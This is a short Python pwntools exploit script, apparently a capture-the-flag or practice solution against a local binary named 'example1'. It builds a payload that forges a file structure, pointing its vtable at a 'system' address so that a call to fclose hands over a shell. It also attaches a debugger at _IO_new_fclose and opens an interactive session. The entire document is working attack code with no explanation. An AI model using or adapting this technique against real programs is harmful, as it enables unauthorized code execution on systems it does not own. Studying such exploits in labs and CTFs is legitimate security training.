#!/usr/bin/env python
# __author__ = 'lowkey'
# -*- coding: utf-8 -*-
from pwn import *

binary = './example1'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30

buf_addr = 0x601080
system = 0x4005b7
pay = (('\0' * 0x10 + \
    p64(system) + \
    '\0' * 0x70 + \
    p64(buf_addr)).ljust(0xd8, '\0') + \
    p64(buf_addr)).ljust(0x100, '\0') + \
p64(buf_addr)

gdb.attach(io, 'b _IO_new_fclose')
io.sendline(pay)

io.interactive()
